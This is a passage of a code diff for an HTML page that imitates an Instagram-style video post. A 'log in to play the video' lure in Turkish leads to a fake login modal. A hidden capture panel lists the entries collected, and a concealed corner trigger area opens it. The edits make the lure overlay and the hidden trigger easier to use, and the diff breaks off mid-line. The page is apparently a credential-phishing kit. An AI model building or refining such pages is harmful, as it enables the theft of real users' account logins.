@@ -18,7 +18,7 @@
         .more-options { font-weight: bold; color: #262626; cursor: pointer; }
         .media-container { position: relative; width: 100%; height: 500px; background: #000; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         .media-bg { width: 100%; height: 100%; object-fit: cover; filter: blur(22px); opacity: 0.55; transform: scale(1.1); pointer-events: none; }
-        .play-overlay { position: absolute; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; z-index: 2; text-align: center; padding: 20px; width: 100%; height: 100%; background: rgba(0,0,0,0.15); }
+        .play-overlay { position: absolute; display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; z-index: 10; text-align: center; padding: 20px; width: 100%; height: 100%; background: rgba(0,0,0,0.15); }
         .play-btn { width: 64px; height: 64px; background: rgba(0, 0, 0, 0.6); backdrop-filter: blur(4px); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin-bottom: 12px; border: 2px solid rgba(255, 255, 255, 0.8); transition: transform 0.2s; }
         .play-btn:hover { transform: scale(1.05); }
         .play-btn svg { width: 24px; height: 24px; fill: #fff; margin-left: 3px; }
@@ -29,6 +29,7 @@
         .likes-count { font-weight: 600; font-size: 14px; margin-bottom: 6px; }
         .caption { font-size: 14px; line-height: 1.4; color: #262626; }
         .caption span { font-weight: 600; margin-right: 6px; }
+        
         #login-modal { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.65); backdrop-filter: blur(5px); display: none; align-items: center; justify-content: center; z-index: 1000; }
         .modal-box { background-color: #ffffff; color: #262626; border: 1px solid #dbdbdb; border-radius: 8px; padding: 40px; width: 350px; text-align: center; box-shadow: 0 4px 24px rgba(0,0,0,0.15); }
         .logo { font-size: 2.5rem; margin-bottom: 20px; font-weight: bold; letter-spacing: -1px; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto; color: #000; }
@@ -37,6 +38,7 @@
         input:focus { border-color: #a8a8a8; }
         button { width: 100%; background-color: #0095f6; border: none; border-radius: 4px; color: white; font-weight: 600; padding: 9px; cursor: pointer; margin-top: 10px; font-size: 14px; transition: background-color 0.2s; }
         button:hover { background-color: #1877f2; }
+        
         #capture-panel { position: fixed; bottom: 15px; right: 15px; width: 340px; background: #1e1e1e; color: #0f0; border: 1px solid #333; border-radius: 6px; box-shadow: 0 5px 20px rgba(0,0,0,0.4); font-family: monospace; font-size: 11px; display: none; z-index: 99999; overflow: hidden; }
         .panel-header { background: #2d2d2d; padding: 8px 12px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #444; color: #fff; }
         .panel-body { max-height: 200px; overflow-y: auto; padding: 8px; }
@@ -45,7 +47,9 @@
         .del-btn:hover { background: #c52c2c; }
         .log-item { border-bottom: 1px dashed #333; padding: 8px 0; }
         .log-item:last-child { border-bottom: none; }
-        #trigger-zone { position: fixed; bottom: 0; right: 0; width: 80px; height: 80px; z-index: 99998; cursor: default; background: transparent; }
+        
+        /* Sağ alt köşe tetikleme alanı (kolay tıklanabilmesi için boyutu ve katmanı ayarlandı) */
+        #trigger-zone { position: fixed; bottom: 0; right: 0; width: 100px; height: 100px; z-index: 99998; cursor: pointer; background: transparent; }
     </style>
 </head>
 <body>
@@ -64,14 +68,6 @@
             <video class="media-bg" autoplay muted loop playsinline>
                 <source src="https://assets.mixkit.co/videos/preview/mixkit-tree-branches-in-the-breeze-1185-large.mp4" type="video/mp4">
             </video>
-            <div class="play-overlay" onclick="triggerGate()">
+            <div class="play-overlay" id="play-trigger">
                 <div class="play-btn">
-                    <svg viewBox="0 0 24 24"><polygon points="6,4 20,12 6,20"></polygon></svg>
-                </div>
-                <span class="lure-text">Videoyu oynatmak için oturum açın</span>
-            </div>
-        </div>
-        <div class="post-footer">
-            <div class="post-actions">
-                <div class="post-actions-left">
-                    <svg viewBox="0 0 24 24"><path d="M16.792 3.904A4.989 4.989 0 0 1 21.5 9.122c0 3.072-2.652 5.859-5.197 8.43-1.043 1.054-2.134 2.127-3.132 3.045l-.035.032-.03
+                    <svg viewBox="0
